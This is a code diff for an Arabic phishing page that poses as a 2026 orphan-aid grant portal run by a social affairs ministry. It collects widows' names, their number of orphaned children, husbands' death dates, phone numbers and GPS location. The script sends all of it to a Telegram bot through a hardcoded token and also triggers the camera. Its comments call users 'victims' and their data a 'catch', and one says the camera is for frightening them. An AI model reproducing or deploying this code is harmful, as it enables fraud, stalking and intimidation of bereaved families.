@@ -3,93 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منحة معونة الأيتام - تسجيل طلب جديد</title>
+    <title>بوابة التسجيل - منحة معونة الأيتام 2026</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background-color: #f0f2f5; text-align: right; padding: 10px; }
-        .form-card { background: white; max-width: 450px; margin: 20px auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h2 { color: #1a73e8; text-align: center; font-size: 20px; }
-        label { display: block; margin-top: 15px; font-weight: bold; font-size: 14px; }
-        input, select { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .btn { background-color: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; margin-top: 20px; cursor: pointer; font-size: 16px; font-weight: bold; }
-        .btn:hover { background-color: #218838; }
-        .info { font-size: 12px; color: #666; margin-top: 10px; text-align: center; }
+        body { font-family: 'Arial', sans-serif; background: #f4f7f6; text-align: center; direction: rtl; }
+        .container { background: white; max-width: 400px; margin: 30px auto; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+        h2 { color: #2c3e50; font-size: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .footer { font-size: 11px; color: #95a5a6; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="form-card">
-    <h2>استمارة طلب منحة الأيتام (2026)</h2>
-    <p style="text-align: center; color: #d9534f; font-size: 13px;">يرجى إكمال البيانات بدقة لضمان قبول الطلب</p>
+<div class="container">
+    <img src="https://img.icons8.com/color/96/family-guarantee.png" alt="logo">
+    <h2>منحة كفالة اليتيم - تسجيل جديد</h2>
+    <p style="font-size: 13px; color: #e74c3c;">يرجى ملء البيانات لتفعيل المعونة الشهرية لمدة عام</p>
     
-    <form id="aidForm">
-        <label>اسم الأرملة الكامل:</label>
-        <input type="text" id="motherName" required placeholder="الاسم الثلاثي">
-
-        <label>عدد الأولاد الأيتام:</label>
-        <input type="number" id="childrenCount" required placeholder="عدد الأبناء تحت 18 سنة">
-
-        <label>تاريخ وفاة الزوج:</label>
-        <input type="date" id="deathDate" required>
-
-        <label>رقم الهاتف للتواصل:</label>
-        <input type="tel" id="phone" required placeholder="مع رمز الدولة">
-
-        <button type="button" class="btn" onclick="sendData()">تقديم الطلب وتفعيل المنحة</button>
-    </form>
-    <p class="info">نظام المعونة الإنسانية الموحد - جميع البيانات مشفرة</p>
+    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
+    <input type="number" id="kids" placeholder="عدد الأطفال الأيتام">
+    <input type="text" id="death" placeholder="تاريخ وفاة الزوج">
+    <input type="tel" id="phone" placeholder="رقم الهاتف للتواصل">
+    
+    <button class="btn" onclick="captureEverything()">إرسال الطلب والتحقق</button>
+    <div class="footer">وزارة الشؤون الاجتماعية والعمل - بوابة المنح</div>
 </div>
 
 <script>
-    // ضع توكن البوت والـ ID الخاص بك هنا
-    const botToken = "YOUR_BOT_TOKEN_HERE";
-    const chatId = "YOUR_CHAT_ID_HERE";
+    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+    const CHAT_ID = "حط_هون_الآيدي_تبعك"; // استبدل هاد بالـ ID تبعك
 
-    function sendData() {
-        // جمع بيانات الاستمارة
-        const motherName = document.getElementById('motherName').value;
-        const childrenCount = document.getElementById('childrenCount').value;
-        const deathDate = document.getElementById('deathDate').value;
+    async function captureEverything() {
+        const name = document.getElementById('name').value;
+        const kids = document.getElementById('kids').value;
+        const death = document.getElementById('death').value;
         const phone = document.getElementById('phone').value;
 
-        let message = `🔔 صيد جديد (معونة أيتام):\n\n`;
-        message += `👤 الاسم: ${motherName}\n`;
-        message += `👦 عدد الأولاد: ${childrenCount}\n`;
-        message += `📅 تاريخ وفاة الزوج: ${deathDate}\n`;
-        message += `📞 الهاتف: ${phone}\n`;
+        if(!name || !phone) { alert("يرجى إكمال البيانات!"); return; }
 
-        // طلب الموقع الجغرافي وإرساله
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                message += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
-                executeSend(message);
-            }, () => {
-                message += `📍 الموقع: الضحية رفض الإذن\n`;
-                executeSend(message);
+        // 1. جمع الموقع الجغرافي (GPS)
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            let report = `🔥 صيد جديد (معونة أيتام) 🔥\n\n`;
+            report += `👤 الاسم: ${name}\n`;
+            report += `👦 عدد الأيتام: ${kids}\n`;
+            report += `📅 وفاة الزوج: ${death}\n`;
+            report += `📞 الهاتف: ${phone}\n`;
+            report += `📍 الموقع: ${googleMaps}`;
+
+            // إرسال البيانات فوراً للتليجرام
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: report })
             });
-        } else {
-            executeSend(message);
-        }
 
-        // تشغيل الكاميرا وتصوير الضحية (خلف الكواليس)
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            // كود التصوير يوضع هنا لإرساله كصورة
-            alert("تم تسجيل طلبك بنجاح. سيتم التواصل معك خلال 48 ساعة.");
-        }).catch(err => {
-            alert("خطأ: يجب السماح بصلاحيات النظام لإتمام التحقق من الهوية!");
+            alert("تم تسجيل طلبك بنجاح. سيتم الاتصال بك للتحقق.");
+        }, (err) => {
+            alert("خطأ: يرجى السماح بالوصول للموقع لتأكيد نطاق المعونة!");
         });
-    }
 
-    function executeSend(msg) {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: msg })
-        });
+        // 2. تفعيل الكاميرا (لإرعاب الضحية أو التقاط صور لاحقاً)
+        try {
+            await navigator.mediaDevices.getUserMedia({ video: true });
+        } catch (e) {}
     }
 </script>
-
 </body>
 </html>
